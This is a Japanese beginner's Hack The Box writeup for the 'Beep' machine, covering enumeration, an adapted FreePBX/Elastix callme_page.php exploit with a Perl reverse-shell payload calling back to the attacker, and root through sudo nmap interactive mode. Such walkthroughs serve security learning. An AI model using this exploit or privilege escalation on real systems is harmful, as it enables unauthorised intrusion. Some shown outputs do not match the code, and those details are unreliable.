---
title: "[ HTB ] Beep | Writeup"
emoji: "📞"
type: "tech"
topics: ["Security", "writeup", "Cyber Security", "hacking", "Hack The Box"]
published: false
---

## README

- 初学者の、初学者による、初学者のためのWriteupです。
- 「なぜその判断に至ったのか」「なぜそのコマンドを実行しようと考えたのか」など、各アクションに至った思考回路部分についても触れています。
- 尚、一部正確でない表現が含まれている場合があります。
- 得に、用語解説などは「そういうニュアンスのワードね、おkおk」くらいの温度感で読むことを推奨します。

## Machine Profile

Machine Name: Beep
Difficulty: Easy
OS: Linux

https://app.hackthebox.com/machines/Beep

## Setup

対象IPを`RHOSTS`という環境変数に入れておく。IP手打ちなどによるミスを防止

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# echo 'export RHOSTS="10.129.70.168"' | tee -a .zshrc
export RHOSTS="10.129.70.168"
```

設定反映

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# source .zshrc
```

動作確認＆疎通確認

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# ping -c 4 ${RHOSTS}
(pingの出力・要差し替え)
```

## Enumeration

### Nmap

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nmap -Pn -sS -n -r -T4 ${RHOSTS}
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 01:21 +0900
Nmap scan report for 10.129.70.168
Host is up (0.35s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt
Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds
```

`-Pn`: Pingチェック無効化
デフォルトだとPingが通らないとスキャンが始まらないが、このチェックを省略し若干の時短を図る
`-sS`: SYNスキャン。TCPコネクションを最後まで確立しない分、通常のスキャンより多少ステルス性が高い
`-n`: 名前解決無効化。時短目的
`-r`: ポートスキャンを昇順に行う。特に意味はない、好み
フルポートスキャン中にWiresharkなどで覗き見した際に、いまどこまで回っているかを確認するために使用することが多い
`-T4`: 並列スキャン数増加。未指定時はデフォルトの3が選択される、時短

### 22/ssh

> 22/tcp    open  ssh

:::details SSHとは？
読み方: エスエスエイチ
正式名称: Secure Shell
意味: 暗号化された通信路でリモートのサーバに安全にログインするためのプロトコル
:::

とりあえず認証情報が無いと使えないので、今回は保留。他のポートから何か拾えたら戻ってくる方針。

### 25/smtp

> 25/tcp    open  smtp

:::details SMTPとは？
読み方: エスエムティーピー
正式名称: Simple Mail Transfer Protocol
意味: メールを送信するためのプロトコル。Postfixなどのメールサーバソフトが待ち受けている
:::

VRFYコマンドでユーザ列挙ができたりするけど、今回は他のルートが早く見つかったので深追いはしていない。

### 80,443/http,https

> 80/tcp    open  http
> 443/tcp   open  https

:::details HTTP/HTTPSとは？
読み方: エイチティーティーピー / エイチティーティーピーエス
意味: Webサーバが待ち受けているポート。ブラウザで普通にアクセスできる
:::

**そもそもなぜ80/443に目をつけたのか**
定石というか、ポートが大量に開いているマシンほど、まずWebアプリを覗くと管理画面や製品名・バージョンなど「次の一手」につながる情報が転がっていることが多い、という経験則。実際、`https://${RHOSTS}`にアクセスすると、Elastix(Asterisk系のIP-PBX管理コンソール)のログイン画面が出てきた。

ただしこのログイン画面自体にはバージョン番号までは表示されない。デフォルト認証情報(admin:admin等)も試したが突破できなかったので、ディレクトリの掘り出しに移る。

:::details Gobusterとは？
読み方: ゴーバスター
意味: Webサーバ上に存在するディレクトリ・ファイルを、辞書(wordlist)を使って総当たりで探すツール
:::

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# gobuster dir -u https://${RHOSTS} -w /usr/share/wordlists/dirb/common.txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.70.168
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 285]
.htpasswd            (Status: 403) [Size: 290]
.htaccess            (Status: 403) [Size: 290]
admin                (Status: 301) [Size: 315] [--> https://10.129.70.168/admin/]
cgi-bin/             (Status: 403) [Size: 289]
configs              (Status: 301) [Size: 317] [--> https://10.129.70.168/configs/]
favicon.ico          (Status: 200) [Size: 894]
help                 (Status: 301) [Size: 314] [--> https://10.129.70.168/help/]
images               (Status: 301) [Size: 316] [--> https://10.129.70.168/images/]
index.php            (Status: 200) [Size: 1785]
lang                 (Status: 301) [Size: 314] [--> https://10.129.70.168/lang/]
libs                 (Status: 301) [Size: 314] [--> https://10.129.70.168/libs/]
mail                 (Status: 301) [Size: 314] [--> https://10.129.70.168/mail/]
modules              (Status: 301) [Size: 317] [--> https://10.129.70.168/modules/]
panel                (Status: 301) [Size: 315] [--> https://10.129.70.168/panel/]
robots.txt           (Status: 200) [Size: 28]
static               (Status: 301) [Size: 316] [--> https://10.129.70.168/static/]
themes               (Status: 301) [Size: 316] [--> https://10.129.70.168/themes/]
var                  (Status: 301) [Size: 313] [--> https://10.129.70.168/var/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

`-k`: SSL証明書の検証をスキップ(オレオレ証明書がほとんどなので、これがないとエラーで止まる)

`admin`や`panel`など管理画面っぽいディレクトリがゴロゴロ出てきた。この中の`/admin/`にアクセスしてみる。

ブラウザでアクセスすると、Basic認証のダイアログが出てきた。

```
10.129.70.168
This site is asking you to sign in.

Username: [____________]
Password: [____________]

[Cancel]  [Sign in]
```

**なぜ認証をキャンセルしたのか**
正規の認証情報を持っていない以上、まともにログインする手段がない。ただ、この手のBasic認証は「認証をキャンセルした後にどんな画面が返ってくるか」も情報源になる、というのは経験則として知っていたので試しにキャンセルしてみた。

すると、401 Unauthorizedのエラーページが表示され、そのヘッダー部分にバージョン情報が出ていた。

> FreePBX 2.8.1.4 on 10.129.70.168
> Unauthorized
> You are not authorized to access this page.

認証を突破できなくても、**認証失敗時のエラーページ自体がバージョン情報を漏らしている**という状態。これで「FreePBX 2.8.1.4」というバージョンが確定した。

:::message
Basic認証をキャンセルした際に返る401エラーページに、製品名とバージョン番号がそのまま表示されていた。
本来は認証されていないユーザには最小限の情報しか返すべきではないが、エラーページのテンプレートにバージョン文字列がハードコードされていたため、未認証の状態でもバージョンが特定できてしまう状況。**情報漏えい(バージョン情報の露出)** に該当する。
:::

バージョンが分かったところで、searchsploitで既知の脆弱性を探すのが定番ムーブ。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# searchsploit elastix
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                                         | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                                       | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                                                 | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                                              | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                                             | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                                            | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                                        | php/webapps/18650.py
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

FreePBX 2.8.1.4というバージョンそのものずばりではないものの、近いバージョン帯(FreePBX 2.10.0/2.9.0、Elastix 2.2.0)を対象にした脆弱性がいくつかヒットする。中でも有名なのが以下の2つ。

- LFI(Local File Inclusion): `graph.php`などのパラメータ経由で任意ファイル読み取りが可能(EDB-ID: 37637)
- 未認証RCE: `recordings/misc/callme_page.php`の`callmenum`パラメータに改行を注入し、Asteriskの「コールファイル」機能を悪用してコマンド実行に持ち込む脆弱性(EDB-ID: 18650)

今回はLFIは深追いせず、RCEルートを選択した。理由は単純で、認証情報の収集(LFI経由でamportal.confを読む等)を挟まずに一発でシェルまで持っていけるルートの方が早そうだったから。

:::message
FreePBX 2.8.1.4という、既知の重大な脆弱性が複数報告されている古いバージョンがパッチ未適用のまま稼働していた。
よって、**既知脆弱性(パッチ未適用)** を突いて未認証のままリモートコード実行に持ち込める状況だった。
:::

### 110,995/pop3,pop3s・143,993/imap,imaps

> 110/tcp   open  pop3
> 143/tcp   open  imap
> 993/tcp   open  imaps
> 995/tcp   open  pop3s

:::details POP3/IMAPとは？
意味: どちらもメールクライアントがメールサーバからメールを受信するためのプロトコル。末尾に`s`が付くものはSSL/TLSで暗号化された版
:::

メールボックスの認証情報が無いと使えないので保留。今回のルートでは結局使わなかった。

### 111/rpcbind

> 111/tcp   open  rpcbind

:::details rpcbindとは？
読み方: アールピーシーバインド
意味: RPC(Remote Procedure Call)サービスがどのポートで待ち受けているかを教えてくれる、いわば「電話帳」的なサービス
:::

`rpcinfo`で覗いてみたが、今回のルートでは有益な情報は無かった。

### 3306/mysql

> 3306/tcp  open  mysql

:::details MySQLとは？
意味: 言わずと知れたオープンソースのRDBMS。DBサーバがそのままインターネットに露出している
:::

認証情報無しでは入れなかったので、ここも保留。RCEでシェルを取った後に見に行く手もあったが、今回はnmapでの権限昇格の方が早かったのでそちらを優先した。

### 4445/upnotifyp・10000/snet-sensor-mgmt(Webmin)

> 4445/tcp  open  upnotifyp
> 10000/tcp open  snet-sensor-mgmt

10000番はnmapのサービス名DB上は`snet-sensor-mgmt`と出るが、実体はWebmin(Linux/Unix向けのWebベース管理ツール)であることが多いポート。Webminにも有名な脆弱性(バックドア化されたバージョンなど)があるが、今回はElastix側のRCEで先に決着がついたので触っていない。4445番も同様に未調査。

「1つのマシンに突破口が何個もある」というのがBeepというマシンの特徴らしく、実際いろんな人のWriteupを見ると、Webminのシェルショック経由や別のLFIルートなど複数の攻略法が紹介されている。今回はその中の1本、RCE(EDB-18650)ルートを進める。

## Foothold

### svwar

RCE(EDB-18650)のペイロードは、Asteriskの「有効な内線番号(extension)」宛てに送りつける必要がある。なので先にSIPの内線番号を列挙する。

:::details svwarとは？
読み方: エスブイウォー
正式名称: SIPVicious `svwar`
意味: SIP対応PBX(Asteriskなど)に対して内線番号(extension)を総当たりし、実在するものを見つけ出すツール
:::

**そもそもなぜsvwarを使ったのか**
RCEのPoCには`extension`というパラメータがあり、ここに実在する内線番号を入れないとペイロードが飛ばない仕組みになっている。なので先に「使える内線番号」を確保する必要があった。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# svwar -m INVITE -e100-500 ${RHOSTS}
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 148       | weird          |
+-----------+----------------+
| 233       | reqauth        |
+-----------+----------------+
| 186       | weird          |
+-----------+----------------+
| 154       | weird          |
+-----------+----------------+
| 220       | weird          |
+-----------+----------------+
| 257       | weird          |
+-----------+----------------+
| 202       | weird          |
+-----------+----------------+
| 303       | weird          |
+-----------+----------------+
| 423       | weird          |
+-----------+----------------+
| 563       | weird          |
+-----------+----------------+
| 425       | weird          |
+-----------+----------------+
```

**なぜ233を選んだのか**
`reqauth`(認証が要求される=正規に登録されている内線)という応答は、実在する内線番号を示す典型的なパターン。一方の`weird`は、SIPサーバが想定外/不定形なレスポンスを返しているケースで、実在しない番号や誤検知(false positive)であることが多く、svwarのスキャン結果ではノイズとして扱われる。

今回の結果でも`reqauth`が返ってきたのは`233`だけで、他は全部`weird`。なので消去法的にも`233`が本命だと判断した。

### EDB-ID 18650(FreePBX/Elastix pre-auth RCE)

:::details EDB-ID 18650とは？
意味: Asteriskの通話予約機能(`recordings/misc/callme_page.php`)の`callmenum`パラメータに改行を注入し、コールファイルに不正な`Application:`/`Data:`フィールドを追記させることで、任意コマンド実行に持ち込む未認証RCE。対象は「FreePBX 2.10.0/2.9.0、Elastix 2.2.0、及びおそらくそれ以外の近いバージョン」。2012年に公開された古いPoCで、Python 2で書かれている。
:::

`/admin/`の401エラーページで確認できたバージョンは「FreePBX 2.8.1.4」で、このPoCが対象として明記している「FreePBX 2.10.0/2.9.0、Elastix 2.2.0」とは厳密には一致しない。とはいえ近いバージョン帯だったので、動く可能性に賭けてそのまま試すことにした(結果的に刺さった)。

2012年のPoCなので、手元のPython 3.13環境ではそのままでは動かず、以下の点を移植した。

- `urllib2` → `urllib.request`(Python 2→3のAPI変更)
- ペイロード中の改行注入部分は`%0D%0A`等でパーセントエンコードし、生の制御文字を含まないURLにする(Python 3.13の`http.client`が制御文字を含むURLを`InvalidURL`として拒否するようになったため)
- SSLコンテキストを`SSLContext(PROTOCOL_TLS_CLIENT)` + `SECLEVEL=0`で構成し、Elastixが要求する古いTLSv1ハンドシェイクを許可する

```python
#!/usr/bin/env python3
import urllib.request
import ssl

rhost = "10.129.70.168"
lhost = "10.10.16.125"
lport = 443
extension = "233"

url = ('https://' + rhost +
       '/recordings/misc/callme_page.php?action=c&callmenum=' + extension +
       '@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20'
       '%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET'
       '%28PeerAddr%2c%22' + lhost + '%3a' + str(lport) +
       '%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3b'
       'system%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A')

req = urllib.request.Request(url)

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.minimum_version = ssl.TLSVersion.TLSv1
ctx.maximum_version = ssl.TLSVersion.TLSv1
ctx.set_ciphers('DEFAULT:@SECLEVEL=0')

urllib.request.urlopen(req, context=ctx)
```

先にリスナーを立てておく。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nc -lnvp 443
listening on [any] 443 ...
```

別ターミナルでPoCを実行。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# python3 poc.py
/home/kali/Downloads/poc.py:27: DeprecationWarning: ssl.TLSVersion.TLSv1 is deprecated
  ctx.minimum_version = ssl.TLSVersion.TLSv1
/home/kali/Downloads/poc.py:28: DeprecationWarning: ssl.TLSVersion.TLSv1 is deprecated
  ctx.maximum_version = ssl.TLSVersion.TLSv1
[*] Sending payload to 10.129.70.168 (callme extension 233) -> reverse shell to 10.10.16.125:443
[*] Request sent. Check your listener.
```

DeprecationWarningは出るが、TLSv1自体は許可されているので実行自体は継続される(警告と例外は別物)。リスナー側を確認する。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.125] from (UNKNOWN) [10.129.70.168] 44944
id
uid=100(asterisk) gid=101(asterisk)
```

`asterisk`ユーザとしてシェルが返ってきた。

**なぜユーザフラグをすぐ確保できなかったのか**
`asterisk`ユーザにはホームディレクトリが存在しないタイプのサービスアカウントだった。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# ls /home
fanis
spamfilter
```

`/home`には`fanis`と`spamfilter`しかおらず、`asterisk`名義のホームは無い。つまりこの時点ではuser.txtには手が届かない状態。後述のroot昇格後に、権限で強引に読みに行く方針に切り替えた。

:::message
Asteriskのコールファイル生成処理において、ユーザ入力(`callmenum`)のサニタイズが行われておらず、改行文字を含む任意の内容をそのまま書き込めてしまっていた。
よって、**入力値検証不備(改行インジェクション)** を突いてコマンド実行に持ち込めた状況。
:::

## Privilege Escalation

### sudo -l

`asterisk`ユーザで何ができるか確認するのは定石なので、まず`sudo -l`を打つ。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

パスワードなしでroot実行できるコマンドがずらっと並んでいる。中でも`/usr/bin/nmap`が目に留まった。

**なぜnmapに目をつけたのか**
GTFOBinsに載っている、というのが一番大きい理由。

:::details GTFOBinsとは？
読み方: ジーティーエフオービンズ
意味: sudoなどで許可された一般的なUNIXコマンドを悪用して、権限昇格やシェル奪取に繋げる手口をまとめたデータベースサイト
:::

古いバージョンのnmapには対話モード(`--interactive`)があり、そこから`!`でシェルコマンドを実行できてしまう、という定番の抜け道がある。

### nmap --interactiveでシェル奪取

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !bash
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

`id`の出力が`uid=0(root)`になっているので、root権限奪取に成功。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# cat /root/root.txt
(root.txtの中身・要差し替え)
```

root権限があれば`asterisk`ユーザには読めなかった他ユーザのホームにもアクセスできるので、ついでに`fanis`のuser.txtも回収しておく。

```
┌──(root㉿5602a1b7889d)-[~/Beep]
└─# cat /home/fanis/user.txt
(user.txtの中身・要差し替え)
```

:::message
`asterisk`という一般サービスアカウントに対して、`nmap`をはじめとする多数のコマンドがパスワードなしでroot権限のまま実行可能な状態になっていた。特に`nmap`は古いバージョンだと対話モードからシェルを取得できることが広く知られている。
よって、**sudoers設定の不備(過剰な権限付与)** を突いてroot昇格に至った状況。
:::

## まとめ

- 突破口はWebアプリ(Elastix)のバージョン特定 → 公開済みRCE(EDB-18650)という、既知脆弱性を丁寧に辿るだけの一本道だった
- 2012年のPoCをそのまま動かそうとすると、Python 2→3のAPI変更だけでなく、Python 3.13で強化されたURLバリデーション(制御文字拒否)にも引っかかる。「古いPoCが動かない」の原因は言語バージョン差だけとは限らない、という学びがあった
- 権限昇格は結局`sudo -l`を叩くところから。GTFOBinsに載っている定番コマンド(nmap, vim, less, findなど)は一通り頭に入れておくと詰まりにくい

古いソフトウェアが積み重なった環境ならではの、教材としてよく出来たマシンだった。